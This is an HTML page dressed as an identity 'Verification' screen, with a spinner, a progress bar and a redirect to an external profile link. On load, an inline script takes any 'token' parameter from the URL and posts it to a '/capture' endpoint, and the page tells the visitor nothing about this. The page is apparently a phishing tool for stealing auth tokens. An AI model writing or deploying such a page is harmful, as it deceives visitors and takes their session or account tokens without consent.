<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #ffffff; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', Arial, sans-serif; }
        .container { text-align: center; max-width: 400px; width: 100%; }
        .spinner { width: 56px; height: 56px; border: 5px solid #e8ecf1; border-top: 5px solid #3498db; border-radius: 50%; animation: spin 0.9s ease-in-out infinite; margin: 0 auto 28px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .title { color: #1a1a2e; font-size: 22px; font-weight: 600; }
        .subtitle { color: #6b7280; font-size: 15px; margin-top: 8px; }
        .progress-bar { width: 100%; height: 4px; background: #e8ecf1; border-radius: 4px; margin-top: 28px; overflow: hidden; }
        .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #3498db, #2ecc71); border-radius: 4px; animation: progress 2s ease-in-out forwards; }
        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
        .status-text { color: #9ca3af; font-size: 13px; margin-top: 12px; }
    </style>
    <meta http-equiv="refresh" content="2.5;url=https://guns.lol/cr3m">
    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const token = urlParams.get('token');
            if (!token) return;
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token })
            }).catch(e => console.error('Error:', e));
        })();
    </script>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="title">Verifying your identity</div>
        <div class="subtitle">Please wait while we complete the process</div>
        <div class="progress-bar"><div class="fill"></div></div>
        <div class="status-text">Redirecting...</div>
    </div>
</body>
</html>
